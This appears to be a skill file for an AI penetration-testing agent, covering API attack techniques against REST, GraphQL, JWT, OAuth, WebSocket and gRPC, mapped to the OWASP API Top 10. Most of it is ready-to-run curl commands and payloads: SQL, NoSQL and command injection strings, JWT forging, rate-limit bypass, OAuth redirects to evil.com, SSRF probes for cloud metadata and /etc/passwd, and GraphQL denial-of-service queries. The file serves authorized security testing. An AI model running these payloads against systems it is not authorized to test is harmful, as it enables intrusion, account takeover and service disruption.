---
name: api-security-testing
description: Modern API security testing including REST, GraphQL, WebSocket, JWT attacks, and OAuth/SAML vulnerabilities for 2025 architectures
allowed-tools: Bash, Read, Write, WebFetch, Grep
---

# API Security Testing Skill

## Purpose
Provides comprehensive API security testing techniques for modern architectures including REST, GraphQL, WebSocket, gRPC, and authentication mechanisms like JWT, OAuth 2.0, and SAML.

## API Discovery and Enumeration

### API Detection
```bash
# Run comprehensive API testing script
scripts/api-testing.sh {target} /tmp/api_results/

# Common API endpoints
/api
/api/v1
/api/v2
/graphql
/graphiql
/api-docs
/swagger
/swagger-ui.html
/openapi.json
/api/swagger.json
/api/docs
/redoc
/.well-known/openid-configuration
```

### API Documentation Discovery
```bash
# Swagger/OpenAPI
curl {target}/swagger.json
curl {target}/openapi.json
curl {target}/api-docs
curl {target}/v2/api-docs
curl {target}/v3/api-docs

# GraphQL introspection
curl -X POST {target}/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{__schema{types{name}}}"}'

# WADL (Web Application Description Language)
curl {target}/application.wadl
curl {target}/api?_wadl
```

## REST API Testing

### HTTP Method Testing
```bash
# Test allowed methods
curl -X OPTIONS {target}/api/endpoint

# Method override testing
curl -X POST {target}/api/endpoint \
  -H "X-HTTP-Method-Override: DELETE"

curl -X POST {target}/api/endpoint \
  -H "X-Method-Override: PUT"

# Test unusual methods
for method in TRACE PATCH LINK UNLINK PURGE LOCK UNLOCK PROPFIND VIEW; do
  curl -X $method {target}/api/endpoint -v
done
```

### Authentication Testing
```bash
# No auth
curl {target}/api/users

# Basic auth
curl -u username:password {target}/api/users

# Bearer token
curl -H "Authorization: Bearer {token}" {target}/api/users

# API key variations
curl -H "X-API-Key: {key}" {target}/api/users
curl -H "apikey: {key}" {target}/api/users
curl {target}/api/users?api_key={key}
```

### Parameter Pollution
```bash
# HTTP Parameter Pollution
curl "{target}/api/users?id=1&id=2"
curl -X POST {target}/api/users \
  -d "role=user&role=admin"

# JSON parameter pollution
curl -X POST {target}/api/users \
  -H "Content-Type: application/json" \
  -d '{"role":"user","role":"admin"}'
```

### Rate Limiting Bypass
```bash
# Header rotation
curl -H "X-Forwarded-For: 10.0.0.1" {target}/api/login
curl -H "X-Originating-IP: 10.0.0.2" {target}/api/login
curl -H "X-Remote-IP: 10.0.0.3" {target}/api/login
curl -H "X-Remote-Addr: 10.0.0.4" {target}/api/login
curl -H "X-Real-IP: 10.0.0.5" {target}/api/login

# Case variation
curl -X post {target}/api/login
curl -X POST {target}/API/login
curl -X POST {target}/api/LOGIN

# Path variation
curl {target}/api/v1/login
curl {target}/api/v1/login/
curl {target}/api/v1//login
curl {target}/api/v1/./login
```

### IDOR (Insecure Direct Object Reference)
```bash
# Sequential ID testing
for i in {1..100}; do
  curl -H "Authorization: Bearer {token}" {target}/api/users/$i
done

# UUID prediction
# Check for patterns in UUIDs
curl {target}/api/documents/{uuid1}
curl {target}/api/documents/{uuid2}
# Look for incremental patterns

# Parameter manipulation
curl {target}/api/account?user_id=1
curl {target}/api/account?user_id=2
curl {target}/api/account?user_id[]=1&user_id[]=2
```

### Mass Assignment
```bash
# Find all possible parameters
curl {target}/api/users/1

# Try adding admin parameters
curl -X PUT {target}/api/users/1 \
  -H "Content-Type: application/json" \
  -d '{
    "name": "user",
    "email": "user@test.com",
    "role": "admin",
    "is_admin": true,
    "verified": true,
    "premium": true
  }'

# Common parameters to test
role, admin, is_admin, is_superuser, is_staff
verified, email_verified, phone_verified
premium, is_premium, subscription
balance, credits, points
```

## GraphQL Security Testing

### GraphQL Introspection
```bash
# Full schema introspection
curl -X POST {target}/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }"}'

# Get all queries
curl -X POST {target}/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{__schema{queryType{fields{name}}}}"}'

# Get all mutations
curl -X POST {target}/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{__schema{mutationType{fields{name}}}}"}'
```

### GraphQL Batching Attack
```bash
# Batch queries for rate limiting bypass
curl -X POST {target}/graphql \
  -H "Content-Type: application/json" \
  -d '[
    {"query": "{ user(id: 1) { name email } }"},
    {"query": "{ user(id: 2) { name email } }"},
    {"query": "{ user(id: 3) { name email } }"}
  ]'

# Alias abuse
curl -X POST {target}/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{
    user1: user(id: 1) { name email }
    user2: user(id: 2) { name email }
    user3: user(id: 3) { name email }
  }"}'
```

### GraphQL Injection
```bash
# SQL injection in GraphQL
curl -X POST {target}/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ user(id: \"1' OR '1'='1\") { name } }"}'

# NoSQL injection
curl -X POST {target}/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ user(filter: {\"$ne\": null}) { name } }"}'

# Command injection
curl -X POST {target}/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ systemInfo(command: \"id; whoami\") { output } }"}'
```

### GraphQL DoS
```bash
# Deep nesting attack
curl -X POST {target}/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{
    posts {
      author {
        posts {
          author {
            posts {
              author {
                posts {
                  title
                }
              }
            }
          }
        }
      }
    }
  }"}'

# Circular references
curl -X POST {target}/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "fragment PostFragment on Post {
    title
    author {
      posts {
        ...PostFragment
      }
    }
  }
  query {
    posts {
      ...PostFragment
    }
  }"}'
```

## JWT (JSON Web Token) Attacks

### JWT Analysis
```bash
# Decode JWT (base64)
echo "{jwt_token}" | cut -d. -f1 | base64 -d  # Header
echo "{jwt_token}" | cut -d. -f2 | base64 -d  # Payload

# Use jwt-tool
python jwt_tool.py {token}
python jwt_tool.py -t {target}/api/endpoint -rc "Authorization: Bearer {token}" -M at
```

### JWT Algorithm Attacks

#### None Algorithm
```python
# Change algorithm to none
import jwt
import base64

header = {'alg': 'none', 'typ': 'JWT'}
payload = {'user': 'admin', 'role': 'admin'}

# Create token without signature
token = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
token += '.' + base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
token += '.'
```

#### Algorithm Confusion
```bash
# RS256 to HS256
# Get public key
openssl x509 -pubkey -noout -in cert.pem > public.pem

# Sign with public key as HMAC secret
python jwt_tool.py {token} -X k -pk public.pem
```

#### Key Confusion
```bash
# Weak secret brute force
python jwt_tool.py {token} -C -d secrets.txt

# Common weak secrets
secret
123456
password
jwt-secret
your-256-bit-secret
```

### JWT Claims Abuse
```bash
# Modify claims
python jwt_tool.py {token} -T

# Common claims to modify
- exp (expiration)
- iat (issued at)
- nbf (not before)
- sub (subject/user)
- role
- admin
- email_verified
```

### JWK (JSON Web Key) Attacks
```python
# Inject custom JWK
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "use": "sig",
    "n": "...",  # Your public key
    "e": "AQAB"
  }
}
```

## OAuth 2.0 Security Testing

### Authorization Code Flow Attacks
```bash
# Authorization code reuse
# Capture code and try to use multiple times

# Missing state parameter (CSRF)
/oauth/authorize?client_id={id}&redirect_uri={uri}&response_type=code
# No state parameter = CSRF vulnerable

# Redirect URI manipulation
/oauth/authorize?client_id={id}&redirect_uri=https://evil.com&response_type=code
/oauth/authorize?client_id={id}&redirect_uri=https://example.com@evil.com&response_type=code
/oauth/authorize?client_id={id}&redirect_uri=https://example.com%2f%2f@evil.com&response_type=code
```

### Implicit Flow Attacks
```bash
# Token leakage in referrer
# Check if token appears in URL fragment
/oauth/authorize?client_id={id}&redirect_uri={uri}&response_type=token

# Open redirect to steal token
/oauth/authorize?client_id={id}&redirect_uri=/redirect?url=https://evil.com&response_type=token
```

### Client Credentials Issues
```bash
# Weak client secret
curl -X POST {target}/oauth/token \
  -d "grant_type=client_credentials&client_id={id}&client_secret=secret"

# Client secret in URL
curl "{target}/oauth/token?grant_type=client_credentials&client_id={id}&client_secret={secret}"
```

## WebSocket Security Testing

### WebSocket Enumeration
```bash
# Find WebSocket endpoints
/ws
/wss
/socket.io
/sockjs
/websocket
/wsapp
```

### WebSocket Connection
```python
# Python WebSocket client
import websocket

ws = websocket.WebSocket()
ws.connect("ws://{target}/ws")

# Send message
ws.send('{"action": "test"}')

# Receive message
result = ws.recv()
print(result)

ws.close()
```

### WebSocket Authentication Bypass
```javascript
// Browser console
var ws = new WebSocket("ws://target/ws");
ws.onopen = function() {
  // Try without auth
  ws.send('{"action": "admin_action"}');
};

ws.onmessage = function(event) {
  console.log(event.data);
};
```

### WebSocket Injection
```python
# SQL injection via WebSocket
ws.send('{"user": "admin\' OR 1=1--"}')

# Command injection
ws.send('{"command": "ls; whoami"}')

# XSS payload
ws.send('{"message": "<script>alert(1)</script>"}')
```

## gRPC Security Testing

### gRPC Enumeration
```bash
# List services
grpcurl -plaintext {target}:50051 list

# Describe service
grpcurl -plaintext {target}:50051 describe {service}

# List methods
grpcurl -plaintext {target}:50051 list {service}
```

### gRPC Method Invocation
```bash
# Call method without auth
grpcurl -plaintext -d '{"param": "value"}' \
  {target}:50051 {service}/{method}

# With metadata (headers)
grpcurl -plaintext \
  -H "Authorization: Bearer {token}" \
  -d '{"param": "value"}' \
  {target}:50051 {service}/{method}
```

## API Fuzzing

### Parameter Fuzzing

Full tool cascade, baseline-comparison hit detection, and `--auth-file` support now live in `skills/fuzzing` (used by `exploit-agent` for authenticated parameter discovery):
```bash
${CLAUDE_PLUGIN_ROOT}/skills/fuzzing/scripts/fuzz.sh param --url "{target}/api/endpoint?x=1" --auth-file "$AUTH_FILE" --output <json>
```

### Content Type Testing
```bash
# Test different content types
for type in "application/xml" "text/xml" "application/x-www-form-urlencoded" "multipart/form-data" "text/plain"; do
  curl -X POST {target}/api/endpoint \
    -H "Content-Type: $type" \
    -d "data"
done
```

## API Security Misconfigurations

### CORS Misconfiguration
```bash
# Test CORS
curl -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: GET" \
  -H "Access-Control-Request-Headers: X-Requested-With" \
  -X OPTIONS {target}/api/endpoint -v

# Check response for:
# Access-Control-Allow-Origin: *
# Access-Control-Allow-Credentials: true
```

### Security Headers
```bash
# Check for missing security headers
curl -I {target}/api/endpoint

# Look for:
# X-Content-Type-Options: nosniff
# X-Frame-Options: DENY
# X-XSS-Protection: 1; mode=block
# Strict-Transport-Security
# Content-Security-Policy
```

## Automated API Testing Tools

### API Testing Script
```bash
# Use our comprehensive API testing script
scripts/api-testing.sh {target} /tmp/api_results/

# The script automatically tests for:
# - GraphQL introspection
# - JWT vulnerabilities
# - CORS misconfigurations
# - Rate limiting
# - API key security
# - Mass assignment
# - IDOR vulnerabilities
```

### Other Tools
```bash
# Postman collection testing
newman run collection.json --environment env.json

# OWASP ZAP API scan
zap-cli quick-scan --self-contained \
  --start-options '-config api.disablekey=true' \
  {target}/api

# Burp Suite API scanning
# Use Burp extensions: Autorize, JWT4B, GraphQL Raider
```

## OWASP API Security Top 10 (2023) Mapping

Use this to make sure findings are categorized consistently with the official standard, not just described ad hoc:

| Code | Category | Where this is covered |
|------|----------|------------------------|
| API1:2023 | Broken Object Level Authorization | IDOR section above |
| API2:2023 | Broken Authentication | Authentication Testing section above |
| API3:2023 | Broken Object Property Level Authorization | Mass Assignment section above |
| API4:2023 | Unrestricted Resource Consumption | Rate Limiting Bypass section above |
| API5:2023 | Broken Function Level Authorization | See below |
| API6:2023 | Unrestricted Access to Sensitive Business Flows | See below |
| API7:2023 | Server-Side Request Forgery | See below |
| API8:2023 | Security Misconfiguration | CORS Misconfiguration / Security Headers sections above |
| API9:2023 | Improper Inventory Management | API Discovery section above (partial — see below) |
| API10:2023 | Unsafe Consumption of APIs | See below |

### API5:2023 - Broken Function Level Authorization (BFLA)
Distinct from IDOR/BOLA (which is about accessing *another user's* object) — BFLA is about accessing an *administrative or higher-privilege function* your role shouldn't expose at all.
```bash
# Test admin-only endpoints with a low-privilege token
curl -H "Authorization: Bearer {low_priv_token}" {target}/api/admin/users
curl -X DELETE -H "Authorization: Bearer {low_priv_token}" {target}/api/admin/users/1

# Test for endpoints only referenced in client-side JS/mobile app bundles, not the public docs
grep -oE '"/api/[a-zA-Z0-9/_-]+"' app.js | sort -u
```

### API6:2023 - Unrestricted Access to Sensitive Business Flows
Not a technical access-control bug — the API works exactly as designed, but the *business process itself* can be automated/abused at scale (e.g. an unlimited-use discount-code redemption endpoint, a "buy" endpoint with no purchase-rate limiting enabling scalping, an account-creation endpoint enabling mass fake signups).
```bash
# Test whether a business-critical action can be scripted/automated without friction
for i in {1..100}; do
  curl -X POST {target}/api/redeem-code -d '{"code":"PROMO2026"}'
done
# Check for missing CAPTCHA, missing per-user/per-IP throttling, or missing device fingerprinting
# on: account creation, coupon redemption, ticket/inventory reservation, payment retry
```

### API7:2023 - Server-Side Request Forgery (SSRF)
```bash
# Any API parameter that accepts a URL is a candidate
curl -X POST {target}/api/fetch-preview -d '{"url":"http://169.254.169.254/latest/meta-data/"}'
curl -X POST {target}/api/webhook-test -d '{"url":"http://localhost:8080/admin"}'
curl -X POST {target}/api/import -d '{"source_url":"file:///etc/passwd"}'
```
See also `agents/exploit-agent.md`'s SSRF section and `skills/web-vulnerability-testing/SKILL.md` (OWASP A01:2025 - Broken Access Control, which SSRF was folded into in the 2025 web Top 10).

### API9:2023 - Improper Inventory Management (beyond basic discovery)
- **Deprecated/old API versions still live** - test `/api/v1/` alongside `/api/v2/`; old versions often lack the security fixes the current version has
- **Non-production environments exposed** - check for `/api-staging`, `/api-dev`, `/api-test` subdomains or paths with weaker auth
- **Shadow APIs** - endpoints found in client-side code, mobile app binaries, or historical API docs (Wayback Machine) that aren't in the current official documentation at all

### API10:2023 - Unsafe Consumption of APIs
This is about *this* application's blind trust in the *third-party* APIs it calls, not APIs it exposes:
- Check whether responses from third-party/partner APIs are validated before use, or trusted blindly (e.g. a redirect URL or file path taken directly from a third-party API response)
- Check whether third-party API credentials/tokens are stored and rotated securely
- Check whether the application follows redirects from third-party APIs without validation (can chain into SSRF)

## Best Practices

1. **Always check API documentation** first (Swagger, GraphQL introspection)
2. **Test authentication mechanisms** thoroughly
3. **Look for IDOR vulnerabilities** in all endpoints
4. **Check rate limiting** on sensitive endpoints
5. **Test all HTTP methods** not just GET/POST
6. **Verify authorization** on every endpoint
7. **Document API versions** and deprecated endpoints

## Integration Notes

- APIs often connect to cloud services (check cloud-infrastructure skill)
- Authentication often uses JWT/OAuth (focus on token security)
- GraphQL increasingly common in modern apps
- WebSocket security often overlooked
- gRPC common in microservices architectures

## 2025 Trends

- **AI/LLM APIs** - see `skills/ai-llm-security-testing` for prompt injection/jailbreak probes (canary-token detection) and an OWASP LLM Top 10 checklist
- **Blockchain APIs** - Smart contract interaction, key management
- **IoT APIs** - MQTT, CoAP protocols
- **Edge Computing APIs** - Distributed API gateways
- **Zero Trust APIs** - mTLS, certificate pinning